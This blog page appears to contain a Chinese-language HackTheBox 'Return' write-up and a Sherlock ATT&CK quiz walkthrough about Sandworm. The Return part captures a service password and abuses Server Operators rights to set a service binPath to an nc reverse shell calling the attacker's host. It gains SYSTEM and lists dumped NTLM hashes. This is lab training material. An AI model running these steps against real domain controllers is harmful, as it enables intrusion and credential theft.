class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">$ ldapsearch -H <span class="string">&#x27;ldap://10.129.49.187&#x27;</span> -x -s base                </span><br><span class="line">。。。       </span><br><span class="line">dn:                                                                                              </span><br><span class="line">domainFunctionality: 7                  </span><br><span class="line">forestFunctionality: 7                                                                           </span><br><span class="line">domainControllerFunctionality: 7        </span><br><span class="line">rootDomainNamingContext: DC=<span class="built_in">return</span>,DC=<span class="built_in">local</span>                                                      </span><br><span class="line">ldapServiceName: return.local:printer<span class="variable">$@RETURN</span>.LOCAL                                              </span><br><span class="line">isGlobalCatalogReady: TRUE                                                                       </span><br><span class="line">supportedSASLMechanisms: GSSAPI                                                                  </span><br><span class="line">supportedSASLMechanisms: GSS-SPNEGO      </span><br><span class="line">。。。</span><br><span class="line">subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=<span class="built_in">return</span>,DC=<span class="built_in">local</span></span><br><span class="line">serverName: CN=PRINTER,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Confi</span><br><span class="line"> guration,DC=<span class="built_in">return</span>,DC=<span class="built_in">local</span></span><br><span class="line">schemaNamingContext: CN=Schema,CN=Configuration,DC=<span class="built_in">return</span>,DC=<span class="built_in">local</span></span><br><span class="line">namingContexts: DC=<span class="built_in">return</span>,DC=<span class="built_in">local</span></span><br><span class="line">namingContexts: CN=Configuration,DC=<span class="built_in">return</span>,DC=<span class="built_in">local</span></span><br><span class="line">namingContexts: CN=Schema,CN=Configuration,DC=<span class="built_in">return</span>,DC=<span class="built_in">local</span></span><br><span class="line">namingContexts: DC=DomainDnsZones,DC=<span class="built_in">return</span>,DC=<span class="built_in">local</span></span><br><span class="line">namingContexts: DC=ForestDnsZones,DC=<span class="built_in">return</span>,DC=<span class="built_in">local</span></span><br><span class="line">isSynchronized: TRUE</span><br><span class="line">highestCommittedUSN: 110694</span><br><span class="line">dsServiceName: CN=NTDS Settings,CN=PRINTER,CN=Servers,CN=Default-First-Site-Na</span><br><span class="line"> me,CN=Sites,CN=Configuration,DC=<span class="built_in">return</span>,DC=<span class="built_in">local</span></span><br><span class="line">dnsHostName: printer.return.local</span><br><span class="line">defaultNamingContext: DC=<span class="built_in">return</span>,DC=<span class="built_in">local</span></span><br><span class="line">currentTime: 20250430015221.0Z</span><br><span class="line">configurationNamingContext: CN=Configuration,DC=<span class="built_in">return</span>,DC=<span class="built_in">local</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># search result</span></span><br><span class="line">search: 2</span><br><span class="line">result: 0 Success</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>把<code>printer.return.local</code>也加到hosts里面，在web上看一下</p>
<h3 id="printer-return-local"><a href="#printer-return-local" class="headerlink" title="printer.return.local"></a>printer.return.local</h3><p><img src="/images/return-1.png"><br><img src="/images/return-2.png"><br>settings.php改了一下发现没啥反应，先爆破一下目录，顺带上一下burp<br><img src="/images/return-3.png"><br>他也只向server提交了IP，别的没看出啥变化来<br>接着枚举一下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">$ python3 /home/wansh/Downloads/enum4linux-ng/enum4linux-ng.py -A 10.129.49.187</span><br><span class="line"> ==========================  </span><br><span class="line">|    Target Information    |                                                                     </span><br><span class="line"> ==========================                                                                      </span><br><span class="line">[*] Target ........... 10.129.49.187                                                             </span><br><span class="line">[*] Username ......... <span class="string">&#x27;&#x27;</span> </span><br><span class="line">[*] Random Username .. <span class="string">&#x27;uomvfqhs&#x27;</span>          </span><br><span class="line">[*] Password ......... <span class="string">&#x27;&#x27;</span>                   </span><br><span class="line">[*] Timeout .......... 5 second(s)              </span><br><span class="line">                                                                                                 </span><br><span class="line"> ======================================                                                          </span><br><span class="line">|    Listener Scan on 10.129.49.187    |                                                         </span><br><span class="line"> ======================================                                                          </span><br><span class="line">[*] Checking LDAP                                                                                </span><br><span class="line">[+] LDAP is accessible on 389/tcp      </span><br><span class="line">[*] Checking LDAPS</span><br><span class="line">[+] LDAPS is accessible on 636/tcp</span><br><span class="line">[*] Checking SMB</span><br><span class="line">[+] SMB is accessible on 445/tcp</span><br><span class="line">[*] Checking SMB over NetBIOS</span><br><span class="line">[+] SMB over NetBIOS is accessible on 139/tcp</span><br><span class="line"></span><br><span class="line"> =====================================================</span><br><span class="line">|    Domain Information via LDAP <span class="keyword">for</span> 10.129.49.187    |</span><br><span class="line"> =====================================================</span><br><span class="line">[*] Trying LDAP</span><br><span class="line">[+] Appears to be root/parent DC</span><br><span class="line">[+] Long domain name is: return.local</span><br><span class="line"> ==========================================</span><br><span class="line">|    SMB Dialect Check on 10.129.49.187    |</span><br><span class="line"> ==========================================</span><br><span class="line">[*] Trying on 445/tcp</span><br><span class="line">[+] Supported dialects and settings:</span><br><span class="line">Supported dialects:</span><br><span class="line">  SMB 1.0: <span class="literal">false</span></span><br><span class="line">  SMB 2.02: <span class="literal">true</span></span><br><span class="line">  SMB 2.1: <span class="literal">true</span></span><br><span class="line">  SMB 3.0: <span class="literal">true</span></span><br><span class="line">  SMB 3.1.1: <span class="literal">true</span></span><br><span class="line">Preferred dialect: SMB 3.0</span><br><span class="line">SMB1 only: <span class="literal">false</span></span><br><span class="line">SMB signing required: <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"> ============================================================</span><br><span class="line">|    Domain Information via SMB session <span class="keyword">for</span> 10.129.49.187    |</span><br><span class="line"> ============================================================</span><br><span class="line">[*] Enumerating via unauthenticated SMB session on 445/tcp</span><br><span class="line">[+] Found domain information via SMB</span><br><span class="line">NetBIOS computer name: PRINTER</span><br><span class="line">NetBIOS domain name: RETURN</span><br><span class="line">DNS domain: return.local</span><br><span class="line">FQDN: printer.return.local</span><br><span class="line">Derived membership: domain member</span><br><span class="line">Derived domain: RETURN</span><br><span class="line">==========================================</span><br><span class="line">|    RPC Session Check on 10.129.49.187    |</span><br><span class="line"> ==========================================</span><br><span class="line">[*] Check <span class="keyword">for</span> null session</span><br><span class="line">[+] Server allows session using username <span class="string">&#x27;&#x27;</span>, password <span class="string">&#x27;&#x27;</span></span><br><span class="line"> ====================================================</span><br><span class="line">|    Domain Information via RPC <span class="keyword">for</span> 10.129.49.187    |</span><br><span class="line"> ====================================================</span><br><span class="line">[+] Domain: RETURN</span><br><span class="line">[+] Domain SID: S-1-5-21-3750359090-2939318659-876128439</span><br><span class="line">[+] Membership: domain member</span><br><span class="line"> ================================================</span><br><span class="line">|    OS Information via RPC <span class="keyword">for</span> 10.129.49.187    |</span><br><span class="line"> ================================================</span><br><span class="line">[*] Enumerating via unauthenticated SMB session on 445/tcp</span><br><span class="line">[+] Found OS information via SMB</span><br><span class="line">[+] After merging OS information we have the following result:</span><br><span class="line">OS: Windows 10, Windows Server 2019, Windows Server 2016</span><br><span class="line">OS version: <span class="string">&#x27;10.0&#x27;</span></span><br><span class="line">OS release: <span class="string">&#x27;1809&#x27;</span></span><br><span class="line">OS build: <span class="string">&#x27;17763&#x27;</span></span><br><span class="line">Native OS: not supported</span><br><span class="line">Native LAN manager: not supported</span><br><span class="line">Platform <span class="built_in">id</span>: null</span><br><span class="line">Server <span class="built_in">type</span>: null</span><br><span class="line">Server <span class="built_in">type</span> string: null</span><br></pre></td></tr></table></figure>
<p>只有domain sid，其他的也没有利用点，还是回归settings.php<br>他返回只返回IP，那就只改IP，在本地监听389端口</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">sudo</span> rlwrap -cAr nc -lvnp 389</span><br><span class="line">[<span class="built_in">sudo</span>] wansh 的密码：</span><br><span class="line">Listening on 0.0.0.0 389</span><br><span class="line">Connection received on 10.129.49.187 54950</span><br><span class="line">0*`%<span class="built_in">return</span>\svc-printer</span><br><span class="line">0*`%<span class="built_in">return</span>\svc-printer</span><br><span class="line">                      1edFg43012!!</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>返回了一个密码。。。<br>直接尝试evil-winrm登录<br><code>中间修了一下evil-winrm</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">sudo</span> evil-winrm -i 10.129.49.187 -u svc-printer -p <span class="string">&#x27;1edFg43012!!&#x27;</span></span><br><span class="line">/root/.local/share/gem/ruby/3.4.0/gems/winrm-2.3.9/lib/winrm/psrp/fragment.rb:35: warning: redefining <span class="string">&#x27;object_id&#x27;</span> may cause serious problems</span><br><span class="line">/root/.local/share/gem/ruby/3.4.0/gems/winrm-2.3.9/lib/winrm/psrp/message_fragmenter.rb:29: warning: redefining <span class="string">&#x27;object_id&#x27;</span> may cause serious problems</span><br><span class="line">                                        </span><br><span class="line">Evil-WinRM shell v3.7</span><br><span class="line">                                        </span><br><span class="line">Warning: Remote path completions is disabled due to ruby limitation: undefined method <span class="string">&#x27;quoting_detection_proc&#x27;</span> <span class="keyword">for</span> module Reline</span><br><span class="line">                                        </span><br><span class="line">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion</span><br><span class="line">                                        </span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line">*Evil-WinRM* PS C:\Users\svc-printer\Documents&gt; </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="shell-as-svc-printer"><a href="#shell-as-svc-printer" class="headerlink" title="shell as svc-printer"></a>shell as svc-printer</h2><p>看下权限</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\svc-printer\desktop&gt; <span class="built_in">whoami</span> /priv</span><br><span class="line"></span><br><span class="line">PRIVILEGES INFORMATION</span><br><span class="line">----------------------</span><br><span class="line"></span><br><span class="line">Privilege Name                Description                         State</span><br><span class="line">============================= =================================== =======</span><br><span class="line">SeMachineAccountPrivilege     Add workstations to domain          Enabled</span><br><span class="line">SeLoadDriverPrivilege         Load and unload device drivers      Enabled</span><br><span class="line">SeSystemtimePrivilege         Change the system <span class="keyword">time</span>              Enabled</span><br><span class="line">SeBackupPrivilege             Back up files and directories       Enabled</span><br><span class="line">SeRestorePrivilege            Restore files and directories       Enabled</span><br><span class="line">SeShutdownPrivilege           Shut down the system                Enabled</span><br><span class="line">SeChangeNotifyPrivilege       Bypass traverse checking            Enabled</span><br><span class="line">SeRemoteShutdownPrivilege     Force shutdown from a remote system Enabled</span><br><span class="line">SeIncreaseWorkingSetPrivilege Increase a process working <span class="built_in">set</span>      Enabled</span><br><span class="line">SeTimeZonePrivilege           Change the <span class="keyword">time</span> zone                Enabled</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>其中给的权限很多，不过先枚举一下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\svc-printer\desktop&gt; net user svc-printer</span><br><span class="line">User name                    svc-printer</span><br><span class="line">Full Name                    SVCPrinter</span><br><span class="line">Comment                      Service Account <span class="keyword">for</span> Printer</span><br><span class="line">User<span class="string">&#x27;s comment</span></span><br><span class="line"><span class="string">Country/region code          000 (System Default)</span></span><br><span class="line"><span class="string">Account active               Yes</span></span><br><span class="line"><span class="string">Account expires              Never</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Password last set            5/26/2021 1:15:13 AM</span></span><br><span class="line"><span class="string">Password expires             Never</span></span><br><span class="line"><span class="string">Password changeable          5/27/2021 1:15:13 AM</span></span><br><span class="line"><span class="string">Password required            Yes</span></span><br><span class="line"><span class="string">User may change password     Yes</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Workstations allowed         All</span></span><br><span class="line"><span class="string">Logon script</span></span><br><span class="line"><span class="string">User profile</span></span><br><span class="line"><span class="string">Home directory</span></span><br><span class="line"><span class="string">Last logon                   5/26/2021 1:39:29 AM</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Logon hours allowed          All</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Local Group Memberships      *Print Operators      *Remote Management Use</span></span><br><span class="line"><span class="string">                             *Server Operators</span></span><br><span class="line"><span class="string">Global Group memberships     *Domain Users</span></span><br><span class="line"><span class="string">The command completed successfully.</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
<p>这里可以看到svc-printer是<code>Server Operators</code>组的成员，也是<code>Print Operators</code>组的成员，分别看下两个组都还有哪些</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\svc-printer\desktop&gt; net localgroup <span class="string">&quot;Server Operators&quot;</span></span><br><span class="line">Alias name     Server Operators</span><br><span class="line">Comment        Members can administer domain servers</span><br><span class="line"></span><br><span class="line">Members</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">svc-printer</span><br><span class="line">The <span class="built_in">command</span> completed successfully.</span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\svc-printer\desktop&gt; net localgroup <span class="string">&quot;Print Operators&quot;</span></span><br><span class="line">Alias name     Print Operators</span><br><span class="line">Comment        Members can administer printers installed on domain controllers</span><br><span class="line"></span><br><span class="line">Members</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">svc-printer</span><br><span class="line">The <span class="built_in">command</span> completed successfully.</span><br></pre></td></tr></table></figure>
<p>PRINT那个组可以理解，看一下server那个组有么有利用的方式<br><img src="/images/return-4.png"><br>找到一篇详细的<a target="_blank" rel="noopener" href="https://www.hackingarticles.in/windows-privilege-escalation-server-operator-group/">利用文章</a><br>跟着他给的利用一下<br><strong>具体滥用细节可以看一下文章</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\svc-printer\desktop&gt; services</span><br><span class="line"></span><br><span class="line">Path                                                                                                                 Privileges Service          </span><br><span class="line">----                                                                                                                 ---------- -------          </span><br><span class="line">C:\Windows\ADWS\Microsoft.ActiveDirectory.WebServices.exe                                                                  True ADWS             </span><br><span class="line">\??\C:\ProgramData\Microsoft\Windows Defender\Definition Updates\&#123;5533AFC7-64B3-4F6E-B453-E35320B35716&#125;\MpKslDrv.sys       True MpKslceeb2796    </span><br><span class="line">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\SMSvcHost.exe                                                              True NetTcpPortSharing</span><br><span class="line">C:\Windows\SysWow64\perfhost.exe                                                                                           True PerfHost         </span><br><span class="line"><span class="string">&quot;C:\Program Files\Windows Defender Advanced Threat Protection\MsSense.exe&quot;</span>                                                False Sense            </span><br><span class="line">C:\Windows\servicing\TrustedInstaller.exe                                                                                 False TrustedInstaller </span><br><span class="line"><span class="string">&quot;C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe&quot;</span>                                                     True VGAuthService    </span><br><span class="line"><span class="string">&quot;C:\Program Files\VMware\VMware Tools\vmtoolsd.exe&quot;</span>                                                                        True VMTools          </span><br><span class="line"><span class="string">&quot;C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2104.14-0\NisSrv.exe&quot;</span>                                             True WdNisSvc         </span><br><span class="line"><span class="string">&quot;C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2104.14-0\MsMpEng.exe&quot;</span>                                            True WinDefend        </span><br><span class="line"><span class="string">&quot;C:\Program Files\Windows Media Player\wmpnetwk.exe&quot;</span>                                                                      False WMPNetworkSvc    </span><br><span class="line"><span class="comment">#挑选vss作为狩猎对象</span></span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\svc-printer\desktop&gt; wget http://10.10.16.3:9090/nc.exe -O nc.exe</span><br><span class="line"><span class="comment">#上传nc</span></span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\svc-printer\desktop&gt; sc.exe config VMTools binPath=<span class="string">&quot;C:\Users\svc-printer\desktop\nc.exe -e cmd.exe 10.10.16.3 9002&quot;</span></span><br><span class="line">[SC] ChangeServiceConfig SUCCESS</span><br><span class="line"><span class="comment">#进行滥用，reverse shell插入</span></span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\svc-printer\desktop&gt; sc.exe stop VMTools</span><br><span class="line"></span><br><span class="line">SERVICE_NAME: VMTools</span><br><span class="line">        TYPE               : 10  WIN32_OWN_PROCESS</span><br><span class="line">        STATE              : 1  STOPPED</span><br><span class="line">        WIN32_EXIT_CODE    : 0  (0x0)</span><br><span class="line">        SERVICE_EXIT_CODE  : 0  (0x0)</span><br><span class="line">        CHECKPOINT         : 0x0</span><br><span class="line">        WAIT_HINT          : 0x0</span><br><span class="line">*Evil-WinRM* PS C:\Users\svc-printer\desktop&gt; sc.exe start VMTools</span><br><span class="line"><span class="comment">#启动shell</span></span><br><span class="line"></span><br><span class="line">$ rlwrap -cAr nc -lvnp 9002</span><br><span class="line">Listening on 0.0.0.0 9002</span><br><span class="line">Connection received on 10.129.49.187 59320</span><br><span class="line">Microsoft Windows [Version 10.0.17763.107]</span><br><span class="line">(c) 2018 Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;C:\Users\svc-printer\desktop\rev.exe</span><br><span class="line"></span><br><span class="line">C:\Users\svc-printer\desktop\rev.exe</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;</span><br><span class="line">C:\Windows\system32&gt;</span><br><span class="line"><span class="comment">#由于反弹shell存活时间短，直接快速把之前上传的msf再启动一下</span></span><br><span class="line"></span><br><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 4688 created.</span><br><span class="line">Channel 1 created.</span><br><span class="line">Microsoft Windows [Version 10.0.17763.107]</span><br><span class="line">(c) 2018 Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;<span class="built_in">whoami</span></span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">nt authority\system</span><br></pre></td></tr></table></figure>
<h2 id="Hashes"><a href="#Hashes" class="headerlink" title="Hashes"></a>Hashes</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:32db622ed9c00dd1039d8288b0407460:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4e48ce125611add31a32cd79e529964b:::</span><br><span class="line">svc-printer:1103:aad3b435b51404eeaad3b435b51404ee:c1d26bdcecf44246b5f8653284331a2e:::</span><br><span class="line">PRINTER$:1000:aad3b435b51404eeaad3b435b51404ee:0db6da84f360fe606a4eb8ac97165bad:::</span><br></pre></td></tr></table></figure>

    
    
  </div>

  

  

</article>
  
  <article class="post">
  <header class="post-header">
    <h1 class="post-title">
      
      <a class="post-link" href="/2025/06/19/HackTheBox%E2%80%94%E2%80%94SherLock%E2%80%94%E2%80%94UFO-1/HackTheBox%E2%80%94%E2%80%94SherLock%E2%80%94%E2%80%94%20UFO-1/">HackTheBox——SherLock——UFO-1</a>
      
    </h1>

    <div class="post-meta">
      <span class="post-time">
        2025-06-19
      </span>
      
      
      
    </div>
  </header>

  

  <div class="post-content">
    
    
    

    
    <p>Welcome to N0nome&#96;s F**king <a href="https://n0nome.github.io/">blog</a>.<br>(:This is just a joke:)<br><a target="_blank" rel="noopener" href="https://referral.hackthebox.com/mz8uK3T">Do you want to become stronger than me? You just need to move your hands more.</a></p>
<p><code>鉴于博主学识浅薄，文中只写通关，其中利害关系还需要各位Google学习</code><br><img src="/images/Pasted%20image%2020250219150513.png"></p>
<h3 id="Sherlock-Scenario"><a href="#Sherlock-Scenario" class="headerlink" title="Sherlock Scenario"></a>Sherlock Scenario</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Being in the ICS Industry, your security team always needs to be up to date and should be aware of the threats targeting organizations in your industry. You just started as a Threat intelligence intern, with a bit of SOC experience. Your manager has given you a task to test your skills in research and how well can you utilize Mitre Att&amp;ck to your advantage. Do your research on Sandworm Team, also known as BlackEnergy Group and APT44. Utilize Mitre ATT&amp;CK to understand how to map adversary behavior and tactics in actionable form. Smash the assessment and impress your manager as Threat intelligence is your passion.</span><br><span class="line"></span><br><span class="line">在 ICS 行业中，您的安全团队始终需要了解最新情况，并且应该了解针对您所在行业组织的威胁。您刚开始担任威胁情报实习生，拥有一些 SOC 经验。您的经理给了您一项任务来测试您的研究技能以及您如何充分利用 Mitre Att&amp;ck 来发挥自己的优势。对 Sandworm Team（也称为 BlackEnergy Group 和 APT44）进行研究。利用 Mitre ATT&amp;CK 了解如何以可操作的形式绘制对手的行为和策略。粉碎评估并给您的经理留下深刻印象，因为威胁情报是您的热情所在。</span><br></pre></td></tr></table></figure>

<h4 id="Task1"><a href="#Task1" class="headerlink" title="Task1"></a>Task1</h4><p><code>According to the sources cited by Mitre, in what year did the Sandworm Team begin operations?</code><br>让我们评估Sandworm Team，Google一下问题中他是哪一年运作的<br>直接找到<a target="_blank" rel="noopener" href="https://attack.mitre.org/groups/G0034/">Mitre</a>，它提示说</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Sandworm Team is a destructive threat group that has been attributed to Russia&#x27;s General Staff Main Intelligence Directorate (GRU) Main Center for Special Technologies (GTsST) military unit 74455.[1][2] This group has been active since at least 2009.[3][4][5][6]</span><br><span class="line">Sandworm团队是一个破坏性的威胁组织，归因于俄罗斯总参谋长主要情报局（GRU）特殊技术主要中心（GTSST）军事部队74455。 [1] [2]至少自2009年以来，该小组一直活跃。 3] [4] [5] [6]</span><br></pre></td></tr></table></figure>
<p>自2009以来<br><code>Answer：2009</code></p>
<h4 id="Task2"><a href="#Task2" class="headerlink" title="Task2"></a>Task2</h4><p><code>Mitre notes two credential access techniques used by the BlackEnergy group to access several hosts in the compromised network during a 2016 campaign against the Ukrainian electric power grid. One is LSASS Memory access (T1003.001). What is the Attack ID for the other?</code><br>Mitre 注意到 BlackEnergy 组织在 2016 年针对乌克兰电网的攻击活动中使用了两种凭证访问技术来访问被入侵网络中的多个主机。 一种是 LSASS 内存访问 (T1003.001)。 另一个的攻击 ID 是什么？<br>根据提示先找BlackEnergy组织去，然后根据攻击找到另一个攻击id<br><img src="/images/Pasted%20image%2020250219152403.png"><br>从这里可以间接找到2016年的攻击事件<br><img src="/images/Pasted%20image%2020250219153434.png"><br>从里面找凭证访问技术有关的<br><code>Answer:T1110</code></p>
<h4 id="Task3"><a href="#Task3" class="headerlink" title="Task3"></a>Task3</h4><p><code>During the 2016 campaign, the adversary was observed using a VBS script during their operations. What is the name of the VBS file?</code><br>在 2016 年的竞选活动中，观察到对手在行动中使用了 VBS 脚本。 VBS 文件的名称是什么？<br><img src="/images/Pasted%20image%2020250219153740.png"><br>下滑可以找到<br><code>Answer:ufn.vbs</code></p>
<h4 id="Task4"><a href="#Task4" class="headerlink" title="Task4"></a>Task4</h4><p><code>The APT conducted a major campaign in 2022. The server application was abused to maintain persistence. What is the Mitre Att&amp;ck ID for the persistence technique was used by the group to allow them remote access?</code><br>APT 在 2022 年开展了一次大规模行动。 服务器应用程序被滥用来维持持久性。 该团伙使用持久性技术允许他们进行远程访问，那么该技术的 Mitre Att&amp;ck ID 是什么？<br>我们去找2022年的<br><img src="/images/Pasted%20image%2020250219155033.png"><br>上面的<a target="_blank" rel="noopener" href="https://attack.mitre.org/software/S0693">Caddywiper</a>是计划清除任务<br><code>Answer:T1505.003</code></p>
<h4 id="Task5"><a href="#Task5" class="headerlink" title="Task5"></a>Task5</h4><p><code>What is the name of the malware / tool used in question 4?</code><br>问webshell的名字<br><code>Answer:Neo-Regeorg</code></p>
<h4 id="Task6"><a href="#Task6" class="headerlink" title="Task6"></a>Task6</h4><p><code>Which SCADA application binary was abused by the group to achieve code execution on SCADA Systems in the same campaign in 2022?</code><br>在 2022 年的同一次行动中，该组织滥用了哪个 SCADA 应用程序二进制文件在 SCADA 系统上执行代码？<br>直接找一下<br><img src="/images/Pasted%20image%2020250219155448.png"><br><code>Answer:scilc.exe</code></p>
<h4 id="Task7"><a href="#Task7" class="headerlink" title="Task7"></a>Task7</h4><p><code>Identify the full command line associated with the execution of the tool from question 6 to perform actions against substations in the SCADA environment.</code><br>直接看6的截图<br><code>Answer:C:\sc\prog\exec\scilc.exe -do pack\scil\s1.txt</code></p>
